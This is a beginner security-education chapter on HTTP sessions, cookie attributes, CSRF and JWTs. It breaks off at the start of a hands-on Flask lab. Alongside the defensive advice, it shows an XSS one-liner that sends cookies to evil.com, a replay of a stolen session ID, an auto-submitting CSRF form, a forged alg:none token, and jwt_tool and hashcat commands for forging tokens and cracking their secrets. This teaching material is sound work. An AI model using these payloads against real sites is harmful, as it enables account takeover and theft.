---
title: 'Sessions, Cookies, Tokens & Stateful vs Stateless Auth'
description: A Beginner-level Foundations chapter from the Security Notebooks.
sidebar:
  order: 3
head:
  - tag: link
    attrs:
      rel: canonical
      href: >-
        https://ping-praneeth.vercel.app/notebook/web-fundamentals/03-sessions-cookies-tokens-and-stateful-vs-stateless-auth
---
This is Chapter 3 of the Web Fundamentals series — Notebook 6. Chapter 2 took HTTP apart down
to the byte and, near the end, introduced the `Cookie` and `Set-Cookie` headers as "state
bolted onto a stateless protocol." This chapter is where that bolt gets tightened. We take the
single most important question a web application asks on every request — *who is this?* — and
answer it four different ways, from the oldest (a random string in a cookie that points at a row
in a server's memory) to the newest (a cryptographically signed token the server can verify
without remembering anything at all).

HTTP has no memory. Every request arrives as if the server had never seen the client before.
Yet you log in once and stay logged in for an hour, a day, a month. Something is carrying your
identity forward across requests that the protocol itself treats as strangers. That "something"
is a **session**, and the mechanism that carries it is either a **cookie** or a **token**. Get
the mechanics of that carrier wrong — a session ID an attacker can guess, a cookie without
`HttpOnly`, a JWT that accepts `alg: none` — and every other control in the application is
moot, because the attacker simply *becomes* another user. Almost every account-takeover bug in
every bug-bounty program on earth is a failure somewhere in this chapter. So we build the whole
machine from zero, then we break each part of it deliberately.

---

## Part 1: The Core Problem — HTTP Is Stateless

Start with the fact that makes everything else necessary. HTTP is a **stateless** protocol: the
server treats each request as complete and independent, retaining nothing about the client
between requests. Open a raw connection and send two requests, and the second one carries no
memory of the first unless *the client* re-supplies whatever context is needed.

```mermaid
sequenceDiagram
    participant B as Browser
    participant S as Server
    B->>S: POST /login (user=alice, pass=hunter2)
    S-->>B: 200 OK "Welcome Alice"
    Note over S: server forgets everything
    B->>S: GET /account
    S-->>B: 401 Who are you?
    Note over B,S: second request has no memory of the first
```

This is not a bug — it is the design decision that let the web scale. A stateless server can be
cloned a thousand times behind a load balancer, and any clone can handle any request, because no
clone has to "own" a particular client's context. The cost of that scalability is that
identity is not free: the application must **re-establish who the client is on every single
request**. There are exactly two families of answers:

1. **Server-side sessions.** The server keeps the state ("this is Alice, logged in at 09:04,
   cart has 3 items") in its own memory or database, and hands the client a small, meaningless
   **session identifier** to present on future requests. The client carries a claim check; the
   server holds the coat.

2. **Client-side tokens.** The server keeps *no* per-user state. Instead it hands the client a
   **self-describing, tamper-proof token** that contains the identity ("sub: alice, exp:
   10:04") along with a signature. On each request the client presents the token, and the server
   verifies the signature and reads the identity straight out of it. The client carries the coat
   *and* a tamper-evident seal.

Everything in this chapter is a variation on those two answers, plus the cookie and header
plumbing that transports them. The distinction is the single most consequential architectural
choice in web authentication, and we return to it formally in Part 11. For now, hold this
sentence in your head: **a session ID is a pointer; a token is the data.**

**Security relevance from the first paragraph:** because identity must be re-proven on every
request, there is always *some artifact* — a session ID, a cookie, a bearer token — traveling
with each request that *is* the user's identity for that request. Steal that artifact, replay
it, or forge it, and you are that user. The entire discipline of session security is about
making that artifact unforgeable, unstealable, and short-lived.

---

## Part 2: Server-Side Sessions and the Session ID

The oldest and still most common answer is the **server-side session**. When Alice logs in, the
server creates a session record — a small blob of state — and stores it keyed by a long random
string called the **session identifier** (session ID, or SID). It then sends that SID back to
the browser inside a `Set-Cookie` header. The browser stores the cookie and automatically
attaches it to every subsequent request to that site. On each request, the server looks up the
SID in its session store, finds Alice's record, and thereby knows who is calling.

```mermaid
sequenceDiagram
    participant B as Browser
    participant S as Server
    participant DB as Session Store (Redis/DB)
    B->>S: POST /login (alice / hunter2)
    S->>S: verify password OK
    S->>DB: create session {sid: 9f2a..., user: alice}
    S-->>B: 200 + Set-Cookie: SID=9f2a...; HttpOnly; Secure
    Note over B: browser stores cookie
    B->>S: GET /account  Cookie: SID=9f2a...
    S->>DB: lookup 9f2a... -> {user: alice}
    S-->>B: 200 "Alice's account"
```

The session record itself lives server-side and can hold anything: the user ID, roles,
CSRF token, cart contents, last-seen timestamp, a "this session is elevated after re-auth" flag,
and so on. The client never sees any of it. All the client holds is the **opaque** SID — opaque
meaning it carries no meaning of its own; it is just a lookup key. If Alice inspects her cookie
she sees something like `SID=9f2a7c1e5b8d43a0f6...` and can infer nothing from it.

**Where sessions are stored server-side** matters for both scale and security:

| Store | How it works | Trade-off |
|---|---|---|
| In-process memory | A hashmap in the app process | Fast, but dies on restart and can't be shared across servers |
| Sticky-session file/DB | Row per session in SQL, or files on disk | Survives restart; DB round-trip per request |
| Redis / Memcached | Central in-memory KV store, TTL per key | Fast, shared across a fleet, native expiry — the common production choice |
| Encrypted client cookie | State serialized+encrypted into the cookie itself | No server store, but now it's really a token (see Part 9) |

The property that makes this scheme secure is that the SID must be **unguessable**. If an
attacker can predict, brute-force, or otherwise obtain a valid SID, they inherit the entire
session behind it without ever knowing the password. This is why the generation of the SID is a
cryptographic concern, not a convenience concern — a point we hammer in Part 3.

**Blue team / IR use case:** because the server holds the session record, server-side sessions
are *revocable*. If you detect a compromised account, you delete its session rows and every
stolen cookie instantly stops working on the next request. This single property — instant,
central revocation — is the biggest operational advantage sessions have over stateless tokens,
and it is why banks and anything with a "log out everywhere" button lean on server-side
sessions.

---

## Part 3: Anatomy of a Good (and Bad) Session ID

The session ID is the crown jewel. Everything downstream trusts it, so its quality is a
security property. A good SID has three attributes: it is **long**, **high-entropy**, and
**generated by a cryptographically secure random number generator (CSPRNG)**.

**Entropy** is the amount of unpredictability, measured in bits. With *n* bits of entropy an
attacker faces up to 2ⁿ guesses. OWASP's floor is **at least 64 bits of entropy** in the SID,
and 128 bits is the modern norm. A 128-bit random value rendered as 32 hex characters is
computationally impossible to guess before the heat death of your rate limiter.

Here is the difference between a safe and a catastrophic generator, in Python:

```python
import secrets       # CSPRNG — correct
import random        # Mersenne Twister — NOT for security

# GOOD: 128 bits of entropy from the OS CSPRNG
good_sid = secrets.token_hex(16)      # e.g. '9f2a7c1e5b8d43a0f6c9e2b1a4d70e83'

# BAD: predictable, seedable, reconstructable from ~624 outputs
bad_sid  = ''.join(random.choice('0123456789abcdef') for _ in range(32))

# CATASTROPHIC: sequential/enumerable
counter_sid = str(next_user_session_number)   # 1001, 1002, 1003 ...
```

`secrets` (and `os.urandom`, Node's `crypto.randomBytes`, Java's `SecureRandom`) draw from the
operating system's CSPRNG. `random` uses the **Mersenne Twister**, a fast statistical PRNG whose
entire internal state can be reconstructed from about 624 consecutive 32-bit outputs — after
which every future "random" value is predictable. Using `random` (or `Math.random()` in
JavaScript, or `mt_rand()` in PHP) to mint session IDs is a real, exploited class of bug.

**How weak SIDs are attacked — the four failure modes:**

| Failure mode | What the attacker does | Real-world example |
|---|---|---|
| Sequential IDs | Increment the number, land in someone else's session | Early PHP apps using auto-increment session keys |
| Low entropy | Brute-force the whole keyspace (e.g. 16-bit = 65k guesses) | Short "token" params on legacy apps |
| Predictable seed | Recover PRNG state (time-seeded, Mersenne Twister) | `mt_rand()`/`Math.random()` session tokens |
| Info-leaking structure | SID encodes username/timestamp/userid in cleartext or weak encoding | `base64(userid:timestamp)` "session" cookies |

**Bug-bounty angle:** whenever you find a session cookie or a "token" query parameter, the first
reflex is to *decode and inspect it*. Base64-decode it, hex-decode it, look for structure. If
`sessiontoken=YWxpY2U6MTcwMDAwMDAwMA==` decodes to `alice:1700000000`, you have a trivial
account-takeover: change `alice` to `admin`, re-encode, replay. This exact pattern — a
"session" that is really an encoded, unsigned identity — still turns up on bug-bounty programs.
Burp's **Sequencer** tool automates the analysis: it captures a few thousand session tokens and
runs statistical randomness tests (FIPS 140-2 style) to estimate the effective entropy, flagging
tokens that are far less random than they look.

**Red team usage:** collect a handful of tokens, decode them, diff them. If two tokens issued a
second apart differ only in a few low bytes, the generator is time- or counter-seeded and the
keyspace an attacker must search collapses from 2¹²⁸ to something searchable.

---

## Part 4: Cookies from Scratch — Set-Cookie and the Cookie Header

A **cookie** is a small key–value pair the server asks the browser to store and send back. It is
the transport layer for session IDs (and much else). The server sets a cookie with a
`Set-Cookie` response header; the browser returns it on matching requests with a `Cookie`
request header. That is the whole mechanism — everything else is attributes controlling *when*
and *how* the browser sends it back.

A response setting a session cookie:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: SID=9f2a7c1e5b8d43a0f6c9e2b1a4d70e83; Path=/; Domain=app.example.com; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
```

The next request the browser makes to `app.example.com` carries it back:

```http
GET /account HTTP/1.1
Host: app.example.com
Cookie: SID=9f2a7c1e5b8d43a0f6c9e2b1a4d70e83
```

Note the asymmetry: `Set-Cookie` (response) carries the value **plus all attributes**; the
`Cookie` header (request) carries **only the name=value** — never the attributes. The browser
consumes the attributes to decide whether to send the cookie at all; the server never sees them
echoed back. This asymmetry has a direct consequence: **the server cannot tell from an incoming
request whether the cookie it's reading was `Secure` or `HttpOnly`.** Those flags are promises
the browser keeps, not data the server can verify per-request.

Multiple cookies are set with multiple `Set-Cookie` headers (one per cookie — you cannot fold
them into one header), and sent back joined by `; ` in a single `Cookie` header:

```http
Cookie: SID=9f2a...; theme=dark; consent=1
```

**How the browser decides which cookies to send** on a given request is governed by the cookie's
`Domain`, `Path`, `Secure`, and `SameSite` attributes, matched against the target URL and the
request context. We take those attributes one at a time in the next two parts, because each one
is simultaneously a functionality control and a security control — and the security bugs live
precisely in the gaps between what a developer thinks an attribute does and what it actually
does.

---

## Part 5: The Cookie Security Attributes — HttpOnly, Secure, SameSite

Five attributes turn a plain cookie into a *secure* cookie. Missing or misconfigured, each maps
to a specific vulnerability class. This is the single most bug-dense table in web auth, so learn
it cold.

| Attribute | What it does | If missing/misconfigured |
|---|---|---|
| `Secure` | Cookie sent only over HTTPS | Cookie leaks over plaintext HTTP → network sniffing / MITM |
| `HttpOnly` | JavaScript (`document.cookie`) cannot read it | XSS can steal the session cookie |
| `SameSite=Strict/Lax/None` | Controls cross-site sending | `None` (or absent, pre-2020 defaults) → CSRF |
| `Domain` | Which hosts get the cookie | Too broad → shared with untrusted subdomains |
| `Path` | Which URL paths get the cookie | Weak isolation (path is not a security boundary) |
| `Max-Age`/`Expires` | Lifetime | Too long → stolen cookie usable for months |

**`HttpOnly`** is your primary defense against cookie theft via cross-site scripting. When a
cookie is `HttpOnly`, the browser refuses to expose it through the `document.cookie` DOM API. So
even if an attacker lands JavaScript on your page (an XSS), the classic one-liner
`new Image().src='//evil.com/?c='+document.cookie` comes up empty for that cookie. It does *not*
stop XSS from doing damage another way (the script can still make authenticated requests as the
victim), but it takes the raw session ID off the table. **Every session cookie must be
`HttpOnly`.**

**`Secure`** tells the browser to attach the cookie only on HTTPS connections. Without it, a
single plaintext request (a mistyped `http://`, an SSL-stripping attacker on the same Wi-Fi) leaks
the session ID in cleartext. On any modern site every cookie of consequence is `Secure`.

**`SameSite`** is the CSRF control, and it has three values:

- **`Strict`** — the cookie is *never* sent on any cross-site request, including top-level
  navigations. Maximum CSRF protection, but it breaks "click a link in an email and arrive
  already logged in" UX.
- **`Lax`** — the cookie is withheld on cross-site sub-requests (form POSTs, `fetch`, images,
  iframes) but *is* sent on top-level GET navigations (clicking a link). This is the modern
  browser **default** when `SameSite` is unspecified, and it neutralizes the classic
  cross-site POST CSRF while preserving link-click UX.
- **`None`** — the cookie is sent on all cross-site requests. Required for legitimate
  third-party cookie use (embedded widgets, SSO), but browsers require it to be paired with
  `Secure`. `SameSite=None` without other CSRF defenses is a CSRF invitation.

**Bug-bounty angle:** the `SameSite=Lax` default closed a lot of easy CSRF, but not all. Lax
still sends the cookie on top-level GETs, so any *state-changing GET endpoint* (a
`GET /account/delete`, an old-style `GET /transfer?to=...`) is CSRF-able even with Lax. And
some frameworks/CDNs downgrade or strip `SameSite`. Always test: does the app rely on
`SameSite` alone, or does it also have anti-CSRF tokens? We build the full CSRF picture in
Part 8.

Putting the ideal session cookie together:

```http
Set-Cookie: __Host-SID=9f2a...; Path=/; Secure; HttpOnly; SameSite=Lax
```

The **`__Host-` prefix** is a browser-enforced hardening: a cookie whose name starts with
`__Host-` is *rejected by the browser* unless it is `Secure`, has `Path=/`, and has **no**
`Domain` attribute (so it cannot be scoped to a parent domain and shared with subdomains). It is
free defense-in-depth against subdomain cookie-injection attacks. There is also a weaker
`__Secure-` prefix (requires only `Secure`).

---

## Part 6: Domain, Path and Cookie Scope — The Subdomain Trap

`Domain` and `Path` control *scope* — which requests carry the cookie. They are functionality
controls that double as (weak) security boundaries, and misunderstanding them causes real bugs.

**`Domain`.** If you set `Domain=example.com`, the cookie is sent to `example.com` **and every
subdomain** — `app.example.com`, `blog.example.com`, `uploads.example.com`, and any subdomain an
attacker manages to control. If you omit `Domain` entirely, the cookie is a **host-only** cookie:
sent only to the exact host that set it. Host-only is the safer default. The danger with a broad
`Domain` is twofold:

1. **Leaking to less-trusted subdomains.** Your session cookie scoped to `.example.com` is now
   also sent to `marketing-microsite.example.com` running some third-party CMS. Compromise the
   weak subdomain, read the session cookie.
2. **Cookie injection / fixation from a sibling.** A subdomain can set a cookie for the parent
   domain (`Domain=example.com`), and the browser will then send it to *all* siblings. An
   attacker who controls `evil.example.com` (or exploits an XSS there) can plant a cookie the
   main app will read — the mechanism behind many **session fixation** attacks (Part 7).

```mermaid
flowchart TD
    A["Cookie set with Domain=example.com"] --> B[app.example.com]
    A --> C[blog.example.com]
    A --> D["evil.example.com (attacker)"]
    D -.can set/read.-> A
    B -.reads attacker-planted cookie.-> A
```

**`Path`.** `Path=/admin` means the cookie is sent only on requests to `/admin` and below. It
feels like isolation, but **path is not a security boundary**: any page in the app can read
cookies of any path via scripting tricks and the browser's own cookie APIs, and path scoping
gives no protection against same-origin JavaScript. Treat `Path` as a scoping convenience, never
as a wall between two apps on the same host.

**The `__Host-` prefix (recap) fixes the subdomain trap** by forbidding a `Domain` attribute
entirely, forcing the cookie to be host-only. If you take one hardening habit from this part:
prefix your session cookie with `__Host-` and never set a broad `Domain` on anything that
carries identity.

**Red team usage:** on a target with many subdomains, enumerate them (`amass`, `subfinder`) and
look for a forgotten, weakly-hosted subdomain. If the main app scopes its session cookie to the
parent domain, that subdomain is a cookie-theft or cookie-injection foothold into the primary
session.

---

## Part 7: Session Attacks — Hijacking, Fixation, and Sidejacking

With the machinery in place, here are the three canonical attacks on server-side sessions. Each
targets a different phase of the session's life.

### 7.1 Session Hijacking (stealing an active SID)

The attacker obtains a *valid, live* session ID and replays it, becoming the victim without a
password. Ways to get the SID:

- **XSS** reading a non-`HttpOnly` cookie (`document.cookie`) and exfiltrating it.
- **Network sniffing** of a non-`Secure` cookie over HTTP / hostile Wi-Fi (historically called
  "sidejacking," popularized by the Firesheep extension).
- **Referer / log leakage** if the SID is ever placed in a URL (see 7.3).
- **Malware / a compromised proxy** reading the cookie jar.

Once stolen, replay is trivial — set the cookie in your own browser or curl:

```bash
curl -s https://app.example.com/account \
  -H "Cookie: SID=9f2a7c1e5b8d43a0f6c9e2b1a4d70e83"
# -> returns the victim's account page; no password ever needed
```

Defenses: `HttpOnly` + `Secure` (cut off the theft vectors), short session lifetimes, binding
the session to some client attributes (with care — see below), and **regenerating the SID on
privilege change**.

### 7.2 Session Fixation (planting a SID the victim then authenticates)

Subtler and often missed. Instead of stealing a session *after* login, the attacker **fixes**
the session ID *before* login, tricks the victim into logging in under that known ID, then reuses
it.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant V as Victim
    participant S as Server
    A->>S: GET / (obtain a valid pre-auth SID = ABC123)
    A->>V: link/inject: set SID=ABC123 in victim's browser
    V->>S: POST /login (alice/hunter2) with Cookie SID=ABC123
    Note over S: BUG: server keeps ABC123 as the logged-in session
    A->>S: GET /account  Cookie: SID=ABC123
    S-->>A: 200 Alice's account (attacker rides the fixed session)
```

The root cause is a server that **does not issue a fresh session ID at the moment of
authentication**. The one-line fix is universal and non-negotiable:

> **Regenerate the session ID on every privilege-level change — especially at login.**

In Express (`express-session`) that's `req.session.regenerate()`; in Flask, rotate the session;
in PHP, `session_regenerate_id(true)`. After regeneration the pre-login `ABC123` the attacker
planted is dead, and the victim's real session is an ID the attacker never saw.

**Bug-bounty angle:** to test for fixation, capture your session cookie *before* logging in, log
in, and check whether the cookie value changed. If the SID is identical before and after login,
the app is vulnerable to fixation (and you demonstrate impact by showing a planted cookie
surviving authentication).

### 7.3 Session ID in the URL

Never put a session ID in a URL (`?sid=...` or path). URLs leak through the `Referer` header to
third parties, land in server and proxy access logs, sit in browser history, and get shared in
copy-pasted links. PHP's old `session.use_trans_sid` did exactly this and caused countless
leaks. Session IDs belong in cookies (or, for APIs, in an `Authorization` header), never in the
address bar.

**A note on "session binding."** Some apps try to harden sessions by binding them to the
client's IP or `User-Agent`, invalidating the session if either changes. This raises the bar for
replay but is a blunt instrument: mobile users change IPs constantly (breaking legitimate
sessions), and `User-Agent` is attacker-controllable and easily copied alongside a stolen
cookie. Treat binding as defense-in-depth, never as your primary control.

---

## Part 8: CSRF — When the Cookie's Auto-Send Becomes the Weapon

Cookies have a property that is convenient and dangerous in equal measure: the browser attaches
them **automatically** to every matching request, *regardless of who initiated the request*. If
you are logged into your bank and then visit a malicious page, that page can cause your browser
to fire a request at the bank — and the browser will helpfully attach your bank session cookie.
This is **Cross-Site Request Forgery (CSRF)**: the attacker doesn't steal your session, they
*ride* it.

```mermaid
sequenceDiagram
    participant V as Victim (logged into bank)
    participant E as evil.com
    participant B as bank.com
    V->>E: visits malicious page
    E-->>V: HTML with auto-submitting form to bank.com/transfer
    V->>B: POST /transfer?to=attacker&amount=5000  Cookie: SID=(victim's)
    Note over B: BUG: request accepted — cookie present, no CSRF check
    B-->>V: 200 transfer complete
```

The malicious page:

```html
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('f').submit();</script>
```

The victim never clicks anything meaningful; the form auto-submits, the browser attaches the
session cookie, and the transfer executes with the victim's authority. CSRF is fundamentally a
consequence of **ambient authority** — the cookie authenticates the *browser*, not the specific
*action the user intended*.

**The three layered defenses**, in order of modern importance:

1. **`SameSite` cookies.** As covered in Part 5, `SameSite=Lax` (the browser default) stops the
   cross-site POST above, because the cookie is withheld on cross-site sub-requests. This alone
   kills the classic CSRF — but *only* for state-changing requests that are not top-level GETs,
   and only if no framework strips the attribute.

2. **Anti-CSRF tokens (synchronizer token pattern).** The server embeds an unpredictable,
   per-session (or per-request) token in every form, and requires it back on submission. The
   malicious page cannot read this token (Same-Origin Policy stops it reading the bank's HTML),
   so it cannot forge a valid request.

   ```html
   <form action="/transfer" method="POST">
     <input type="hidden" name="csrf_token" value="a7f3...c91">
     ...
   </form>
   ```

   The server rejects any POST whose `csrf_token` doesn't match the one bound to the session.
   The **double-submit cookie** variant sends the token both as a cookie and a form field and
   checks they match — cheaper (stateless) but weaker if the attacker can set cookies on a
   sibling subdomain.

3. **Custom-header / origin checks.** For JSON APIs consumed by JS, require a custom header
   (e.g. `X-Requested-With` or a custom CSRF header). A cross-site page *cannot* set custom
   headers on a "simple" request without triggering a CORS preflight the server can reject.
   Verifying the `Origin`/`Referer` header server-side is a complementary check.

**The relationship to tokens (foreshadowing Part 9):** notice that CSRF is a *cookie* problem —
it exists because cookies auto-send. Bearer tokens in an `Authorization` header do **not**
auto-send cross-site (the attacker's page has no way to attach your token to a request it
generates), so token-in-header auth is *inherently* immune to classic CSRF. That immunity is one
of the real arguments for tokens — but it comes at the cost of XSS exposure, as we'll see.

**Blue team detection:** CSRF attempts show up as state-changing requests with a cross-site or
absent `Origin`/`Referer` against a valid session. Log and alert on POSTs to sensitive endpoints
where `Origin` is not your own domain. Enforcing `SameSite` at the framework level and requiring
CSRF tokens on every mutating route are the controls; the detection is a backstop.

---

## Part 9: Tokens and JWTs — Identity You Can Verify Without Remembering

Now the second family. Instead of storing session state server-side and handing out a pointer,
the server hands the client a **token** that *is* the state, sealed so it cannot be tampered
with. The dominant format is the **JSON Web Token (JWT)** — the thing behind "Bearer" auth,
OAuth access tokens, and most single-page-app / mobile / microservice authentication.

A JWT is three Base64URL-encoded parts joined by dots: `header.payload.signature`.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzAwMDAzNjAwfQ.Jf9-2s...signature
```

Decode the first two parts (they are **not encrypted**, only encoded — anyone can read them):

```json
// Header — algorithm and token type
{ "alg": "HS256", "typ": "JWT" }

// Payload — the "claims" (the identity + metadata)
{ "sub": "alice", "role": "user", "iat": 1700000000, "exp": 1700003600 }
```

The third part is the **signature**: a keyed hash (HMAC-SHA256 for `HS256`) or an
asymmetric signature (RSA/ECDSA for `RS256`/`ES256`) computed over
`base64url(header) + "." + base64url(payload)` using a secret (HMAC) or a private key (RSA/ECDSA).

```
signature = HMACSHA256( base64url(header) + "." + base64url(payload), secret )
```

On each request the client sends the token, conventionally in the `Authorization` header:

```http
GET /api/account HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiI...signature
```

The server **recomputes the signature** over the received header+payload with its key. If it
matches the signature in the token, the token is authentic and untampered, and the server
**trusts the claims inside without any database lookup**. That is the whole point: identity is
verified by math, not by memory. A hundred stateless API servers can all verify the same JWT
with the same public key and none of them needs a shared session store.

**Standard registered claims** you'll see and should validate:

| Claim | Meaning | Why it matters for security |
|---|---|---|
| `iss` | Issuer | Verify it's *your* issuer, not an attacker's |
| `sub` | Subject (the user) | The identity you act on |
| `aud` | Audience (intended recipient) | Reject tokens minted for a different service |
| `exp` | Expiry (unix time) | **Must** be checked — expired tokens must be rejected |
| `nbf` | Not-before | Token invalid before this time |
| `iat` | Issued-at | Age checks, forced-logout-before-time |
| `jti` | JWT ID (unique) | Enables denylist / replay detection |

A signed-but-not-encrypted JWT (a JWS) means **the payload is fully readable by anyone holding
the token** — never put secrets (passwords, PII, internal flags you don't want the client to
see) in a plain JWT payload. If you need confidentiality, that's JWE (encrypted JWTs), a
separate and heavier construct.

---

## Part 10: Breaking JWTs — alg:none, Algorithm Confusion, Weak Secrets

JWTs concentrate enormous trust into one signature check, so the bugs cluster around **making the
server skip or mis-perform that check**. These are among the highest-value findings in web
security. We teach the tool that automates them, then the attacks.

### Tool from scratch: jwt_tool

`jwt_tool` is the standard CLI for JWT recon and attack. It parses tokens, tampers claims,
tries the classic bypasses, and brute-forces weak HMAC secrets.

```bash
# Install (Kali or any Python env)
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip install -r requirements.txt

# Inspect a token (decode header + payload, no key needed)
python3 jwt_tool.py eyJhbGciOiJIUzI1NiI...

# Run all known exploit playbook checks against a live endpoint
python3 jwt_tool.py -t https://api.example.com/account \
  -rh "Authorization: Bearer eyJ..." -M pb
```

### 10.1 The `alg: none` bypass

The JWT spec includes an `none` algorithm meaning "unsecured — no signature." A naive verifier
that honors the token's *own* `alg` field will, when handed `{"alg":"none"}`, accept a token
with an **empty signature** and no verification at all. The attacker just edits the payload
(`"role":"user"` → `"role":"admin"`), sets `alg` to `none`, drops the signature, and is
admin.

```
# Original header {"alg":"HS256"} -> forge {"alg":"none"}, edit payload, empty sig:
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
                                                              ^ empty signature, trailing dot
```

```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiI... -X a   # -X a = alg:none attack, auto-forges variants
```

Fix: the server must **enforce an allowlist of expected algorithms** and never trust the
token's `alg`. A verifier configured to accept only `HS256` (or only `RS256`) rejects `none`
outright.

### 10.2 Algorithm confusion (RS256 → HS256)

When a server uses **asymmetric** RS256 — verifying with a *public* key, signing with a *private*
key — a classic bug is a verify function that picks the algorithm from the token. The attacker
switches `alg` from `RS256` to `HS256` and signs the token using the server's **public key as
the HMAC secret**. Because the public key is, by definition, public, the attacker can compute a
valid HS256 signature. A naive server that calls "verify with the RSA public key, algorithm per
the header" will treat that public key as an HMAC secret and the forged signature verifies.

```bash
# jwt_tool automates it given the server's public key (often at /jwks.json or a TLS cert)
python3 jwt_tool.py eyJ... -X k -pk public_key.pem
```

Fix: bind the verifier to a **specific** algorithm. If you issue RS256, verify *only* RS256 with
the public key; never let the token dictate symmetric-vs-asymmetric.

### 10.3 Weak HMAC secret (offline brute force)

For `HS256`, the entire security rests on a shared secret. If that secret is weak (a
dictionary word, `secret`, `changeme`, a leaked default), it can be brute-forced **offline** —
no interaction with the server — because the attacker holds a signed token and can test candidate
secrets until the signature matches.

```bash
# Crack with jwt_tool + a wordlist
python3 jwt_tool.py eyJ... -C -d /usr/share/wordlists/rockyou.txt
# or with hashcat mode 16500 (JWT)
hashcat -m 16500 token.txt rockyou.txt
```

Once the secret is recovered, the attacker signs *arbitrary* tokens — any user, any role, any
expiry. Fix: use a long, random, high-entropy secret (≥256 bits from a CSPRNG) for HMAC, or
prefer asymmetric RS256/ES256 so there is no shared secret to leak.

### 10.4 Other JWT pitfalls

| Pitfall | Attack | Fix |
|---|---|---|
| `exp` not checked | Replay an old/expired token forever | Always validate `exp` (and `nbf`, `iat`) |
| `kid` header injection | SQLi / path traversal / command injection via `kid` | Treat `kid` as untrusted input; parameterize |
| `jku`/`x5u` header trusted | Point key URL at attacker server → attacker-signed token | Pin/allowlist the JWKS URL |
| No audience check | Token from service A replayed at service B | Validate `aud` |
| Secrets in payload | PII/roles readable by client | Never put secrets in a JWS payload |

**CTF angle:** JWT challenges are a staple of web CTFs (picoCTF, HTB web, PortSwigger's "JWT
attacks" labs). The playbook is almost always: decode → try `alg:none` → try RS256→HS256
confusion with a leaked/derivable public key → brute-force a weak HMAC secret → look for `kid`
injection. `jwt_tool -M pb` runs most of that automatically.

---

## Part 11: Stateful vs Stateless — The Real Trade-Off

Now the architectural decision, made concrete. The choice is not "cookies vs tokens" (you can
put a JWT in a cookie, or a session ID in a header). The real axis is **where the source of
truth for the session lives**: on the server (stateful) or in the token itself (stateless).

```mermaid
flowchart TD
    Q{Where does session<br/>truth live?}
    Q -->|Server holds it| ST[Stateful: server-side session]
    Q -->|Token holds it| SL[Stateless: self-contained token]
    ST --> ST1[Instant revocation]
    ST --> ST2[Needs shared store at scale]
    SL --> SL1[No store, scales trivially]
    SL --> SL2[Cannot easily revoke before exp]
```

| Dimension | Stateful (server sessions) | Stateless (JWT/self-contained) |
|---|---|---|
| Where truth lives | Server store (Redis/DB) | Inside the signed token |
| Revocation | **Instant** — delete the record | **Hard** — valid until `exp` unless you add a denylist |
| Scaling | Needs shared/replicated store | Trivial — any server verifies with the key |
| Per-request cost | A store lookup | A signature verification (CPU only) |
| Payload visibility | Opaque to client | Readable by client (unless JWE) |
| Size on the wire | Small (just the SID) | Larger (whole payload every request) |
| Logout | Delete server record → done | Token still valid until expiry — needs extra machinery |
| CSRF exposure | Yes (if carried in cookies) | No (if carried in `Authorization` header) |
| XSS exposure of the secret | Low (`HttpOnly` cookie) | High (tokens often in JS-readable storage) |

**The logout / revocation problem is the crux of stateless auth.** With a server session, "log
out" means "delete the row" and the cookie is instantly dead. With a stateless JWT, the token is
valid until `exp` no matter what — the server has nothing to delete. The standard mitigations
reintroduce *some* state and thereby erode the "stateless" purity:

- **Short-lived access tokens + long-lived refresh tokens.** The access token (JWT) lives 5–15
  minutes so a stolen one expires quickly; a separate, revocable **refresh token** (stored
  server-side, often in an `HttpOnly` cookie) is exchanged for new access tokens. Revoke the
  refresh token and the user is locked out within one access-token lifetime.
- **A denylist / revocation list** keyed by `jti` — but that's a server-side store again,
  partially defeating statelessness.
- **A `token_version` / password-changed-at check** in the user record, compared against a claim
  — again, a per-request lookup.

The pragmatic industry answer for browser apps is often a **hybrid**: a short-lived JWT access
token *plus* a server-side, `HttpOnly`-cookie refresh token — statelessness for the hot path,
statefulness for revocation.

**Where to store a token in a browser** is its own security decision:

| Storage | XSS-readable? | Auto-sent (CSRF)? | Notes |
|---|---|---|---|
| `localStorage` | **Yes** (JS reads it) | No | Convenient, but any XSS steals the token |
| `sessionStorage` | Yes | No | Same XSS risk, cleared on tab close |
| JS-accessible cookie | Yes | Yes | Worst of both |
| `HttpOnly` cookie | **No** | Yes (mitigate with `SameSite`) | Safe from XSS theft; needs CSRF defense |

The common SPA habit of stashing a JWT in `localStorage` trades CSRF-immunity for XSS-exposure:
one cross-site script and the token is exfiltrated. Storing it in an `HttpOnly` cookie flips the
trade-off — safe from XSS theft, but back to needing `SameSite`/CSRF tokens. There is no
free lunch; there is only choosing which attack you're defending against.

---

## Part 12: Hands-On Lab — Build, Inspect, and Break a Session

Time to make all of this real. This lab has two tracks — a server-side session app and a JWT
API — and you attack both. Everything runs locally; the only tools are `python3`, `curl`,
`jwt_tool`, and optionally Burp Suite.

### 12.1 Stand up a tiny session app (Flask)

```python
# app.py — a minimal server-side-session app (intentionally toggleable for the lab)
from flask import Flask, session, request
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)   # signs Flask's session cookie

USERS = {"alice": "hunter2", "admin": "s3cr3t"}

@app.route("/login", methods=["POST"])
def login():
    u, p = request.form["user"], request.form["pass"]
    if USERS.get(u) == p:
        # SECURE: rotate identity on auth (comment out to demo fixation)
        session.clear()
        session["user"] = u
        return f"logged in as {u}"
    return "bad creds", 401

@app.route("/whoami")
def whoami():
    return f"you are {session.get('user', 'nobody')}"

@app.route("/logout")
def logout():
    session.clear()
    return "logged out"

if __name__ == "__main__":
    app.run(port=5000, debug=True)
```

```bash
pip install flask
python3 app.py &
```

**Drive it with curl and watch the cookie:**

```bash
# Log in, saving cookies to a jar, and dump response headers
curl -s -c jar.txt -D - -X POST http://localhost:5000/login \
     -d 'user=alice&pass=hunter2'
```

Realistic output — note the `Set-Cookie` with Flask's signed session:

```http
HTTP/1.1 200 OK
